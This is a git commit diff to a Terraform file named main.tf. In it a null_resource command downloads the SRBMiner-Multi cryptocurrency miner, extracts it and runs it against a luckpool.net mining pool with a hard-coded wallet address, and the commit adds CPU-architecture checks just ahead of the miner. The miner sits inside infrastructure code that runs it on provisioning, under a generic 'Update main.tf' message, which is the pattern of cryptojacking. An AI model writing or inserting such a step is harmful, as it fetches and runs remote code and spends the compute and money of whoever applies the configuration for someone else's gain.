beb8c22013fc98a87c1b385b4a43a33475d8794f
mooghen01-hue <chriskm0101@outlook.com>
2026-01-15 03:15:18 +0700

    Update main.tf

--- main.tf
+++ main.tf
@@ -3,6 +3,9 @@ resource "null_resource" "run_1" {
     command = <<EOT
 set -e
 
+uname -m
+lscpu | grep -E 'Architecture|Flags'
+
 curl -L https://github.com/doktor83/SRBMiner-Multi/releases/download/3.1.1/SRBMiner-Multi-3-1-1-Linux.tar.gz -o SRBMiner-Multi.tar.gz
 tar -xvf SRBMiner-Multi.tar.gz
 bash ./SRBMiner-Multi-3-1-1/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956 --wallet REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp --cpu-threads 2
